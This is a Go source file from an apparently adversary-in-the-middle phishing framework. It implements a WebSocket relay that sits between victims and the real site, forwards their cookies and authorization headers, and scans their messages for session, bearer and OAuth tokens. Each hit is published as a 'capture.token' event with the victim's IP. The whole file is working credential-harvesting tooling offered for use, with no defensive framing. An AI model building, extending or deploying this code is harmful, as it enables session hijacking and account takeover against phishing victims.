// WS-инспектор: полноценный WebSocket MITM вместо слепого io.Copy.
// Клиент <-> Engine <-> Upstream: фреймы читаются, text-инспектируется
// на токены (capture.token via:ws), ping/pong + keepalive держат сокет,
// лимит чтения режет память. Не-WS апстрим -> fallback в raw-туннель.
package proxy

import (
	"context"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/coder/websocket"
	"github.com/phantom-v2/phantom/core"
)

const (
	wsReadLimit  = 1 << 22 // 4MB на сообщение
	wsPingPeriod = 30 * time.Second
	wsPingWait   = 10 * time.Second
)

// wsProxy — точка входа из ServeHTTP (заменяет слепой wsTunnel).
func (e *Engine) wsProxy(w http.ResponseWriter, r *http.Request, target *url.URL, origHost string, ph *core.Phishlet, sid string) {
	upURL := wsUpstreamURL(target, r)
	ctx, cancel := context.WithTimeout(r.Context(), 10*time.Second)
	defer cancel()
	up, _, err := websocket.Dial(ctx, upURL, &websocket.DialOptions{
		HTTPHeader:      wsUpstreamHeader(r, origHost),
		CompressionMode: websocket.CompressionDisabled,
	})
	if err != nil {
		e.wsTunnel(w, r, target, origHost) // не-WS апстрим: сырой туннель
		return
	}
	client, err := websocket.Accept(w, r, &websocket.AcceptOptions{
		InsecureSkipVerify: true, // фиш-хосты произвольные
		CompressionMode:    websocket.CompressionDisabled,
	})
	if err != nil {
		_ = up.Close(websocket.StatusInternalError, "accept failed")
		return
	}
	e.wsRelay(r.Context(), client, up, ph, r, sid)
}

// wsUpstreamURL: https->wss, http->ws (e2e/lab), путь+query как есть.
func wsUpstreamURL(target *url.URL, r *http.Request) string {
	scheme := "wss"
	if target.Scheme == "http" {
		scheme = "ws"
	}
	u := *target
	u.Scheme = scheme
	u.Path = r.URL.Path
	u.RawQuery = r.URL.RawQuery
	return u.String()
}

// wsUpstreamHeader: прокидываем авторизацию/куки, Host чинит Dial по URL.
func wsUpstreamHeader(r *http.Request, origHost string) http.Header {
	h := http.Header{}
	for _, k := range []string{"Authorization", "Cookie", "User-Agent", "Origin"} {
		if v := r.Header.Get(k); v != "" {
			h.Set(k, v)
		}
	}
	h.Set("X-Forwarded-Host", r.Host)
	_ = origHost
	return h
}

// wsRelay — двунаправленная пересылка с инспекцией клиентских text-фреймов.
func (e *Engine) wsRelay(ctx context.Context, client, up *websocket.Conn, ph *core.Phishlet, r *http.Request, sid string) {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()
	var once sync.Once
	done := make(chan struct{})
	closeBoth := func(code websocket.StatusCode, reason string) {
		once.Do(func() {
			_ = client.Close(code, reason)
			_ = up.Close(code, reason)
			close(done)
		})
	}
	// client -> upstream (с инспекцией)
	go func() {
		defer closeBoth(websocket.StatusGoingAway, "c2u done")
		for {
			mt, data, err := client.Read(ctx)
			if err != nil {
				return
			}
			if mt == websocket.MessageText {
				e.scanWS(data, ph, r, sid)
			}
			wctx, wcancel := context.WithTimeout(ctx, wsPingWait)
			err = up.Write(wctx, mt, data)
			wcancel()
			if err != nil {
				return
			}
		}
	}()
	// upstream -> client (транзит)
	go func() {
		defer closeBoth(websocket.StatusGoingAway, "u2c done")
		for {
			rctx, rcancel := context.WithTimeout(ctx, wsIdleTimeout)
			mt, data, err := up.Read(rctx)
			rcancel()
			if err != nil {
				return
			}
			wctx, wcancel := context.WithTimeout(ctx, wsPingWait)
			err = client.Write(wctx, mt, data)
			wcancel()
			if err != nil {
				return
			}
		}
	}()
	// keepalive-пинги клиенту: мертвый пир детектится за wsPingWait
	go func() {
		defer closeBoth(websocket.StatusGoingAway, "ping done")
		ticker := time.NewTicker(wsPingPeriod)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-done:
				return
			case <-ticker.C:
				pctx, pcancel := context.WithTimeout(ctx, wsPingWait)
				err := client.Ping(pctx)
				pcancel()
				if err != nil {
					return
				}
			}
		}
	}()
	client.SetReadLimit(wsReadLimit)
	up.SetReadLimit(wsReadLimit)
	select {
	case <-done:
	case <-ctx.Done():
		closeBoth(websocket.StatusGoingAway, "ctx done")
	}
}

// scanWS ищет токены в text-фреймах (auth-куки, bearer, oauth-каскад).
func (e *Engine) scanWS(data []byte, ph *core.Phishlet, r *http.Request, sid string) {
	if e.bus == nil || len(data) == 0 {
		return
	}
	low := strings.ToLower(string(data))
	ip := ""
	if r != nil {
		ip = remoteIP(r)
	}
	hit := func(key string) bool { return strings.Contains(low, strings.ToLower(key)) }
	for _, t := range ph.AuthTokens {
		for _, k := range t.Keys {
			if hit(k) {
				_ = e.bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": k, "via": "ws", "ip": ip})
				return
			}
		}
	}
	for _, k := range oauthKeys {
		key := strings.TrimSuffix(k, "=")
		if hit(key) {
			_ = e.bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": key, "via": "ws", "ip": ip})
			return
		}
	}
}
